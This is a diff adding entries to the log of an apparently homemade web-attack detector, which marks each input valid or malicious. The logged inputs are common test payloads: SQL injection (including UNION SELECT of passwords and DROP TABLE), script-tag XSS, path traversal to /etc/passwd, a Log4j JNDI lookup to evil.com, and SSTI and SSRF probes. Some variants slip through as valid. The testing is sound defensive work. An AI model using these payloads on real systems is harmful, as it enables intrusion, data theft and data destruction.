@@ -100,3 +100,69 @@
 2025-05-01 17:05:14 - GET /search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1 Host: www.example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.9 Connection: keep-alive - malicious(ML)
 2025-05-01 17:10:35 - rrrr - valid
 2025-05-01 17:10:40 - GET /search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1 Host: www.example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.9 Connection: keep-alive - malicious(ML)
+2026-10-15 10:57:50 - 'GET /products?category=electronics HTTP/1.1' - valid
+2026-10-15 10:58:09 - 'GET /products?category=electronics HTTP/1.1' - valid
+2026-10-15 10:58:09 - "' OR '1'='1'--" - malicious(signature)
+2026-10-15 10:58:09 - '<script>alert(1)</script>' - malicious(signature)
+2026-10-15 12:39:22 - 'https://finx.org/' - valid
+2026-10-15 12:43:58 - 'https://finx.org/' - valid
+2026-10-15 12:44:00 - 'https://finx.org/' - valid
+2026-10-15 12:44:18 - 'hello' - valid
+2026-10-15 12:44:37 - "' OR '1'='1'--" - malicious(signature)
+2026-10-15 12:46:18 - "' OR '1'='1'--" - malicious(signature)
+2026-10-15 12:57:53 - 'hello' - valid
+2026-10-15 12:58:14 - "'or'1='1" - valid
+2026-10-15 12:58:49 - "or'1'='1" - valid
+2026-10-15 12:58:51 - "or'1'='1" - valid
+2026-10-15 12:58:52 - "or'1'='1" - valid
+2026-10-15 12:59:25 - "' OR '1'='1'" - malicious(signature)
+2026-10-15 13:05:26 - '1 UNION SELECT username,password FROM users' - malicious(signature)
+2026-10-15 13:05:43 - "admin'--" - malicious(signature)
+2026-10-15 13:06:03 - '1; DROP TABLE users' - malicious(signature)
+2026-10-15 13:37:30 - "' OR '1'='1'--" - malicious(signature)
+2026-10-15 13:37:38 - 'hello' - valid
+2026-10-15 13:39:29 - 'https://finxinstitute.com/' - valid
+2026-11-05 10:45:00 - 'hello world' - valid
+2026-11-05 10:45:00 - '../../etc/passwd' - malicious(signature:PATH-001)
+2026-11-05 10:45:00 - '${jndi:ldap://evil.com/a}' - malicious(signature:LOG4J-001)
+2026-11-05 10:45:58 - '%27%20OR%20%271%27%3D%271' - malicious(ml+signature)
+2026-11-05 10:48:50 - '{{7*7}}' - malicious(signature:SSTI-001)
+2026-11-05 11:00:21 - 'hello world' - valid
+2026-11-05 11:02:33 - "or'1'='1" - valid
+2026-11-05 11:02:57 - "'or'1'='1" - valid
+2026-11-05 11:05:17 - "' OR 1=1 --" - malicious(signature:SQLI-002)
+2026-11-05 11:05:57 - "' OR '1'='1'" - malicious(signature:SQLI-002)
+2026-11-05 11:14:50 - 'hello' - valid
+2026-11-05 12:50:12 - '<script>alert(1)</script>' - malicious(signature:XSS-001)
+2026-11-05 12:50:20 - '<script>alert(1)</script>' - malicious(signature:XSS-001)
+2026-11-05 12:50:21 - '<script>alert(1)</script>' - malicious(signature:XSS-001)
+2026-11-05 12:50:22 - '<script>alert(1)</script>' - malicious(signature:XSS-001)
+2026-11-05 12:50:23 - '<script>alert(1)</script>' - malicious(signature:XSS-001)
+2026-11-05 12:55:42 - 'aws' - valid
+2026-11-05 12:55:52 - 'name=john' - valid
+2026-11-05 13:15:58 - '%2527%2520OR%2520%25271%2527%253D%25271' - malicious(ml+signature)
+2026-11-05 15:50:58 - 'https://www.itsecgames.com/' - valid
+2026-11-05 15:51:22 - 'https://www.itsecgames.com/bugs.htm' - valid
+2026-11-05 15:51:27 - 'https://www.itsecgames.com/bugs.html' - valid
+2026-11-05 15:51:28 - 'https://www.itsecgames.com/bugs.html' - valid
+2026-11-05 15:54:06 - 'https://google-gruyere.appspot.com/' - valid
+2026-11-05 15:54:08 - 'https://google-gruyere.appspot.com/' - valid
+2026-11-05 15:54:09 - 'https://google-gruyere.appspot.com/' - valid
+2026-11-05 15:54:09 - 'https://google-gruyere.appspot.com/' - valid
+2026-11-05 15:54:52 - '<script>alert(1)</script>' - malicious(signature:XSS-001)
+2026-11-05 15:54:55 - '<script>alert(1)</script>' - malicious(signature:XSS-001)
+2026-11-05 15:54:56 - '<script>alert(1)</script>' - malicious(signature:XSS-001)
+2026-11-05 15:54:56 - '<script>alert(1)</script>' - malicious(signature:XSS-001)
+2026-11-05 15:54:56 - '<script>alert(1)</script>' - malicious(signature:XSS-001)
+2026-11-14 16:06:04 - 'hello' - valid
+2026-11-14 16:16:31 - 'http://127.0.0.1:5001/' - malicious(signature:SSRF-002)
+2026-11-16 12:33:28 - '<script>alert(1)</script>' - malicious(signature:XSS-001)
+2026-11-16 12:33:31 - '<script>alert(1)</script>' - malicious(signature:XSS-001)
+2026-11-16 12:33:32 - '<script>alert(1)</script>' - malicious(signature:XSS-001)
+2026-11-16 12:33:32 - '<script>alert(1)</script>' - malicious(signature:XSS-001)
+2026-11-16 12:33:32 - '<script>alert(1)</script>' - malicious(signature:XSS-001)
+2026-11-16 12:41:16 - "' OR '1'='1" - malicious(signature:SQLI-002)
+2026-11-16 12:41:16 - "' OR '1'='1" - malicious(signature:SQLI-002)
+2026-11-16 12:41:16 - "' OR '1'='1" - malicious(signature:SQLI-002)
+2026-11-16 12:41:17 - "' OR '1'='1" - malicious(signature:SQLI-002)
+2026-11-16 12:41:17 - "' OR '1'='1" - malicious(signature:SQLI-002)
